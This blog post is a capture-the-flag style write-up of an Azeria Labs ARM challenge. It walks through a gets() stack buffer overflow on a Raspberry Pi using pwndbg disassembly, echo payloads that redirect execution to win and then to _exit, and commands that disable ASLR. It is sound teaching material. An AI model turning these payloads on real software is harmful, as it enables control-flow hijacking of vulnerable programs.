---
layout: post
title: "Smashing ARM Stack for Fun - Part V"
---

[Fifth challenge](https://github.com/azeria-labs/ARM-challenges)
with a small introduction to *process continuation*.<!--more-->


## Planning the exploit

```nasm
pwndbg> pdisass &main
 ► 0x10464 <main>       push   {fp, lr}
   0x10468 <main+4>     add    fp, sp, #4
   0x1046c <main+8>     sub    sp, sp, #0x48
   0x10470 <main+12>    str    r0, [fp, #-0x48]
   0x10474 <main+16>    str    r1, [fp, #-0x4c]
   0x10478 <main+20>    sub    r3, fp, #0x44
   0x1047c <main+24>    mov    r0, r3
   0x10480 <main+28>    bl     #gets@plt <gets@plt>

   0x10484 <main+32>    mov    r0, r3
   0x10488 <main+36>    sub    sp, fp, #4
   0x1048c <main+40>    pop    {fp, pc}
```

`sub r3, fp, #0x44` means that the buffer begins 0x44 bytes from `fp`,
the begin of the stack frame.

As we saw [previously](/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html),
the stack frame includes the *previous* value
of `fp` but not `lr` which it is *immediately below*.

So a buffer overflow of 0x44 bytes will overwrite the stored `fp` and an
overflow of 0x48 will overwrite `fp` and `lr`.

If we do the latter, the function `main` will jump to
our own code on *return*.

{% marginnote
'The left diagram shows the stack from lower
addresses (left) to higher addresses (right) and the `main`&apos;s and
`__libc_start_main`&apos;s stack frames (`main` and `start` for short)
' %}


```nasm
    main --------------v------ start
.......   fp      lr   |  ??   ??   ??   ??
```

As you can see the `fp` and `lr` are stored in the stack as well as an
unknown local variables of `__libc_start_main`.

When the overflow occurs this is the result:

```nasm
    main ---------------v----- start
.......   fp      lr    | ??   ??   ??   ??         (pre-exploit)
    main ---------------v----- start
AAAAAAA   BB      addr1 | ??   ??   ??   ??         (overflow)
```

No more crazy stuff is needed here, we can jump to `win` (`addr1 == 0x1044c`)
directly.

## Exploit level 1

```shell
pi@raspberrypi:~$ echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x4c\x04\x01\x00' | ./stack4
code flow successfully changed
Segmentation fault
```

Yeah! but that segfault looks sloppy.

## A more *polite* exploit

Once `win` executes it will pop from the stack the stored
`lr` and set it into `pc`.

We didn't call `win` with `bl` or similar so the `lr` was never
set correctly and the value pushed in the stack by `win` was garbage.

When `win` returns will jump to who-knows-where.

```nasm
    main ---------------v----- start
.......   fp      lr    | ??   ??   ??   ??         (pre-exploit)
    win ----------------v----- start
          BB      ??    | ??   ??   ??   ??         (win called)
                  ^
                  ret address of win
```

And if we don't jump to `win` exactly?

We could jump to the second instruction of `win`:
we will be **skipping** the `push`.

```nasm
pwndbg> pdisass &win
   0x1044c <win>        push   {fp, lr}
 ► 0x10450 <win+4>      add    fp, sp, #4
   0x10454 <win+8>      ldr    r0, [pc, #4]
   0x10458 <win+12>     bl     #puts@plt <puts@plt>

   0x1045c <win+16>     pop    {fp, pc}
```

In this way we can *emulate* the `push` of `fp` and `lr` adding 8 bytes
to our payload.

```nasm
    main ---------------v--------- start
.......   fp      lr    | ??    ??      ??   ??      (pre-exploit)
    main ---------------v--------- start
AAAAAAA   BB      addr1 | CC    addr2   ??   ??      (overflow extended)
                        v--------- start
          ??      ??    | CC    addr2 | ??   ??      (win called without push)
        ------ win -------------------^
```

So now we control where `win` will return: `addr2`.

## Planning a controlled exit

An ideal situation would make the program continue running after
exploiting it, known as
[process continuation shellcode](https://azeria-labs.com/process-continuation-shellcode/)
but it is too complex for now.

The simplest thing is to call
[`_exit`](https://linux.die.net/man/2/_exit)
a thin glib wrapper of [`exit_group`](https://man7.org/linux/man-pages/man2/exit_group.2.html)
syscall that exits the process and its threads.

```nasm
pwndbg> pdisass &_exit
 ► 0xb6f1b934 <_exit>       push   {r7, lr}
   0xb6f1b938 <_exit+4>     mov    r2, r0
   0xb6f1b93c <_exit+8>     mov    r7, #0xf8
   0xb6f1b940 <_exit+12>    svc    #0
   0xb6f1b944 <_exit+16>    cmn    r0, #0x1000
   0xb6f1b948 <_exit+20>    bhi    #_exit+68 <_exit+68>
```

The `svc #0` is what it triggers the syscall. In Arm 32bits the
instruction is `swi` but the disassembler renames it to the newer name:
*supervisor call*.

The syscall number is passed to the kernel via `r7` as mentioned in [man
syscall(2)](https://man7.org/linux/man-pages/man2/syscall.2.html).

In our case [0xf8 is the syscall number](https://github.com/torvalds/linux/blob/v4.17/arch/arm/tools/syscall.tbl#L265)
of
[`exit_group`](https://man7.org/linux/man-pages/man2/exit_group.2.html).

## Exploit level 2

We are going to cheat a little and disable ASLR so we can hardcode
the address of `_exit` (0xb6f1b934)

```shell
pi@raspberrypi:~$ setarch linux32 --addr-no-randomize /bin/bash
(aslr disabled) pi@raspberrypi:~$ echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x50\x04\x01\x00BBBB\x34\xb9\xf1\xb6' | ./stack4
code flow successfully changed

(aslr disabled) pi@raspberrypi:~$ echo $?
31

(aslr disabled) pi@raspberrypi:~$ exit
exit
```

As you can see the return code of the process was 31. I corroborated
with a debugger the value of the registers before the syscall and `r0`
was 31 as expected.

Instead of jumping to `_exit` we could jump before to a piece of code
--known as gadget-- that sets `r0` to zero and then jump to `_exit`.

But that's for another post.


<!-- stuff -->

<script>
function fix_asm_syntax(ev) {
    // pip install selectq
    //   cond = (val('text()') == 'blt') | (val('text()') == 'b') | (val('text()').startswith('mov')) | ...
    //   div = sQ.select('div', attr('class').contains('language-nasm'))
    //   xpath = div.select('span', cond)

    // Make some instructions "keywords"
    var xpath = ".//div[contains(@class,'language-nasm')]//span[(((text() = 'blt') or (text() = 'b')) or starts-with(text(), 'mov')) or starts-with(text(), 'ldm') or starts-with(text(), 'stm') or starts-with(text(), 'ldr') or starts-with(text(), 'bx') or starts-with(text(), 'bl') or starts-with(text(), 'bne') or starts-with(text(), 'mvn') or starts-with(text(), 'beq') or starts-with(text(), 'svc') or starts-with(text(), 'cmn') or starts-with(text(), 'bhi')]";
    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);

    var elems = [];
    var el = elems_iter.iterateNext();
    while (el) {
        elems.push(el);
        el = elems_iter.iterateNext();
    }
    for (var i = 0; i < elems.length; i++) {
        var el = elems[i];
        el.classList.add('k'); // keyword
        el.classList.remove('n'); // noun
    }

    // Remove the 'err' class
    var xpath = ".//div[contains(@class,'language-nasm')]//span[@class='err']"
    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);

    var elems = [];
    var el = elems_iter.iterateNext();
    while (el) {
        elems.push(el);
        el = elems_iter.iterateNext();
    }
    for (var i = 0; i < elems.length; i++) {
        var el = elems[i];
        el.classList.remove('err'); // syntax error
    }

    // Remove the 'err' class
    var xpath = ".//div[contains(@class,'language-python')]//span[@class='err']"
    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);

    var elems = [];
    var el = elems_iter.iterateNext();
    while (el) {
        elems.push(el);
        el = elems_iter.iterateNext();
    }
    for (var i = 0; i < elems.length; i++) {
        var el = elems[i];
        el.classList.remove('err'); // syntax error
    }
}

document.addEventListener('DOMContentLoaded', fix_asm_syntax);
</script>
